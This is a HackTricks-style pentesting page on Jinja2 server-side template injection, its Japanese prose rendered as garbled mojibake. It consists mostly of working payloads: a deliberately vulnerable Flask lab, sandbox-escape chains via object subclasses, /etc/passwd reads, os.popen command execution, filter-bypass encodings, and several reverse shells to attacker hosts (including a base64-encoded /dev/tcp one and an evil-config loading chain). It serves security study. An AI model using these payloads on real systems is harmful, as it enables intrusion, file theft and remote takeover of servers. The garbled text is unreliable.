# Jinja2 SSTI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ã‚ãªãŸã¯**ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## **Lab**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **ãã®ä»–**

### **ãƒ‡ãƒãƒƒã‚°ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆ**

ãƒ‡ãƒãƒƒã‚°æ‹¡å¼µãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€`debug`ã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦ç¾åœ¨ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚„åˆ©ç”¨å¯èƒ½ãªãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¨ãƒ†ã‚¹ãƒˆã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ãƒãƒƒã‚¬ã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã›ãšã«ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ä½¿ç”¨ã§ãã‚‹ã‚‚ã®ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™ã€‚
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}





</pre>
```
ã‚½ãƒ¼ã‚¹: [https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### **ã™ã¹ã¦ã®è¨­å®šå¤‰æ•°ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**

ã¾ãšã€Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‹ã‚‰ã®è„±å‡ºæ–¹æ³•ã‚’è¦‹ã¤ã‘**ã€é€šå¸¸ã®Pythonã®å®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’å›å¾©ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãª**éã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**æ‚ªç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚

### ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

ä¾‹ãˆã°ã€ã‚³ãƒ¼ãƒ‰`render_template("hello.html", username=username, email=email)`ã§ã¯ã€usernameã¨emailã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯**éã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã®Pythonç’°å¢ƒã‹ã‚‰æ¥ã¦ãŠã‚Š**ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒå†…ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã§ã™ã€‚\
\*\*\*\*ã•ã‚‰ã«ã€**å¸¸ã«ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãª**ä»–ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š
```
[]
''
()
dict
config
request
```
### \<class 'object'>ã®å›å¾©

æ¬¡ã«ã€ã“ã‚Œã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ã‚¯ãƒ©ã‚¹ **`<class 'object'>`** ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€å®šç¾©æ¸ˆã¿ã®ã‚¯ãƒ©ã‚¹ã‚’**å›å¾©**ã™ã‚‹ãŸã‚ã§ã™ã€‚ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ã¯ã€**`__subclasses__`** ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã—ã¦ã€**éã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚ŒãŸ**Pythonç’°å¢ƒã‹ã‚‰ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

ãã® **ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹** ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã¯ã€**ã‚¯ãƒ©ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ** ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€**`__base__`**ã€**`__mro__()[-1]`**ã€ã¾ãŸã¯ **`.`** **`mro()[-1]`** ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã—ã¦ã€ã“ã® **ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹** ã«åˆ°é”ã—ãŸå¾Œã€**`__subclasses__()`** ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€ã“ã‚Œã‚‰ã®ä¾‹ã§ã™ï¼š
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCEã®å›é¿

`<class 'object'>`ã‚’å›å¾©ã—ã€`__subclasses__`ã‚’å‘¼ã³å‡ºã—ãŸã“ã¨ã§ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ãã‚„ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡ŒãŒå¯èƒ½ã«ãªã‚Šã¾ã—ãŸã€‚

`__subclasses__`ã®å‘¼ã³å‡ºã—ã«ã‚ˆã‚Šã€**æ•°ç™¾ã®æ–°ã—ã„é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ©Ÿä¼š**ãŒä¸ãˆã‚‰ã‚Œã¾ã—ãŸã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚¯ãƒ©ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦**ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ã**ã‚’è¡Œã£ãŸã‚Šã€`os`ã®ã‚ˆã†ãª**ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã‚’è¨±å¯ã™ã‚‹ã‚¯ãƒ©ã‚¹**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã€æº€è¶³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ã**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE (Remote Code Execution)**

RCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰ã¯ã€æ”»æ’ƒè€…ãŒãƒªãƒ¢ãƒ¼ãƒˆã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã‚‹è„†å¼±æ€§ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯å¯¾è±¡ã‚·ã‚¹ãƒ†ãƒ ã«æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã€ã‚·ã‚¹ãƒ†ãƒ ã‚’ä¹—ã£å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

RCEã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«ãŠã„ã¦éå¸¸ã«é‡è¦ãªè„†å¼±æ€§ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€RCEã‚’åˆ©ç”¨ã—ã¦ã‚·ã‚¹ãƒ†ãƒ å†…ã®æ©Ÿå¯†æƒ…å ±ã‚’ç›—ã¿å‡ºã—ãŸã‚Šã€ã‚·ã‚¹ãƒ†ãƒ ã‚’å®Œå…¨ã«åˆ¶å¾¡ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

RCEã®æ”»æ’ƒæ‰‹æ³•ã¯ã•ã¾ã–ã¾ã§ã™ãŒã€ä¸€èˆ¬çš„ãªæ‰‹æ³•ã«ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆSSTIï¼‰ã‚„ã‚³ãƒãƒ³ãƒ‰ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®æ”»æ’ƒæ‰‹æ³•ã‚’ç†è§£ã—ã€é©åˆ‡ãªå¯¾ç­–ã‚’è¬›ã˜ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

RCEã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹æ”»æ’ƒè€…ã‹ã‚‰ã‚·ã‚¹ãƒ†ãƒ ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã«ã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‘ãƒƒãƒã®é©ç”¨ã€å…¥åŠ›æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã®å®Ÿæ–½ã€æœ€å°ç‰¹æ¨©ã®åŸå‰‡ã®é©ç”¨ãªã©ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’ç¶™ç¶šçš„ã«å®Ÿæ–½ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
**ã•ã‚‰ã«å¤šãã®ã‚¯ãƒ©ã‚¹**ã‚’å­¦ã¶ãŸã‚ã«ã€**ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—**ã«ä½¿ç”¨ã§ãã‚‹**ã‚¯ãƒ©ã‚¹**ã‚’**ç¢ºèª**ã§ãã¾ã™ã€‚

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãƒã‚¤ãƒ‘ã‚¹

#### ä¸€èˆ¬çš„ãªãƒã‚¤ãƒ‘ã‚¹

ã“ã‚Œã‚‰ã®ãƒã‚¤ãƒ‘ã‚¹ã¯ã€**ä¸€éƒ¨ã®æ–‡å­—ã‚’ä½¿ç”¨ã›ãšã«**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**å±æ€§ã«ã‚¢ã‚¯ã‚»ã‚¹**ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ãƒã‚¤ãƒ‘ã‚¹ã®ã„ãã¤ã‹ã¯ã€å‰ã®ä¾‹ã§æ—¢ã«è¦‹ã¦ãã¾ã—ãŸãŒã€ã“ã“ã§ã¾ã¨ã‚ã¦ã¿ã¾ã—ã‚‡ã†:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ä»–ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã“ã¡ã‚‰**](jinja2-ssti.md#accessing-global-objects)
* [**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ä»–ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯ã“ã¡ã‚‰**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹ãªã—ã§RCEã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã¯ã“ã¡ã‚‰ã‚’èª­ã‚“ã§ãã ã•ã„**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®å›é¿**

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Flaskã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ç†ç”±ã‹ã‚‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®ã™ã¹ã¦ã®HTMLã‚’ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`**ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ã«ã€**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚Œãšã«**JavaScriptã‚„HTMLã‚’ãƒšãƒ¼ã‚¸ã«**æ³¨å…¥**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**æ‚ªæ„ã®ã‚ã‚‹è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãã“ã¨ã«ã‚ˆã‚‹RCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰**

In some cases, the application may load configuration files that are written in a templating language like Jinja2. If the application allows user input to be directly written into these configuration files without proper sanitization, it can lead to Server-Side Template Injection (SSTI) vulnerabilities.

å ´åˆã«ã‚ˆã£ã¦ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒJinja2ã®ã‚ˆã†ãªãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆè¨€èªã§æ›¸ã‹ã‚ŒãŸè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒé©åˆ‡ãªã‚µãƒ‹ã‚¿ã‚¤ã‚ºå‡¦ç†ã‚’è¡Œã‚ãšã«ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’ç›´æ¥ã“ã‚Œã‚‰ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€ã“ã¨ã‚’è¨±å¯ã—ã¦ã„ã‚‹å ´åˆã€ãã‚Œã¯ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆSSTIï¼‰ã®è„†å¼±æ€§ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

One way to exploit this vulnerability is by writing an evil configuration file that contains malicious code. The code can be written in the templating language itself and can execute arbitrary commands on the server.

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã®ä¸€ã¤ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å«ã‚€è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãã“ã¨ã§ã™ã€‚ã‚³ãƒ¼ãƒ‰ã¯ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆè¨€èªè‡ªä½“ã§æ›¸ã‹ã‚Œã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

For example, if the application allows user input to be written into a Jinja2 configuration file, an attacker can craft a payload that includes a template expression that executes arbitrary commands. When the configuration file is loaded by the application, the payload will be executed, resulting in remote code execution.

ãŸã¨ãˆã°ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’Jinja2ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€ã“ã¨ã‚’è¨±å¯ã—ã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¼ã‚’å«ã‚€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ãŒèª­ã¿è¾¼ã¾ã‚Œã‚‹ã¨ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã€ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡ŒãŒè¡Œã‚ã‚Œã¾ã™ã€‚

To prevent this type of attack, it is important to properly sanitize user input before writing it into configuration files. Input validation and output encoding can help mitigate the risk of SSTI vulnerabilities.

ã“ã®ã‚ˆã†ãªæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€å‰ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’é©åˆ‡ã«ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚å…¥åŠ›ã®æ¤œè¨¼ã¨å‡ºåŠ›ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã¯ã€SSTIã®è„†å¼±æ€§ã®ãƒªã‚¹ã‚¯ã‚’è»½æ¸›ã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## ã„ãã¤ã‹ã®æ–‡å­—ã‚’ä½¿ç”¨ã—ãªã„å ´åˆ

**`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**ã‚’ä½¿ç”¨ã›ãšã«
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}



```
## **\<class 'object'>**ã‚’ä½¿ç”¨ã—ãªã„Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

[**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**](jinja2-ssti.md#accessing-global-objects)ã‹ã‚‰ã€ãã®ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã›ãšã«**RCEã«åˆ°é”ã™ã‚‹**åˆ¥ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰**é–¢æ•°**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚Œã°ã€**`__globals__.__builtins__`**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã€ãã“ã‹ã‚‰**RCE**ã¯éå¸¸ã«**ç°¡å˜**ã«ãªã‚Šã¾ã™ã€‚

æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãª**`request`**ã€**`config`**ã€ãŠã‚ˆã³ä»–ã®èˆˆå‘³æ·±ã„**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã‹ã‚‰**é–¢æ•°**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
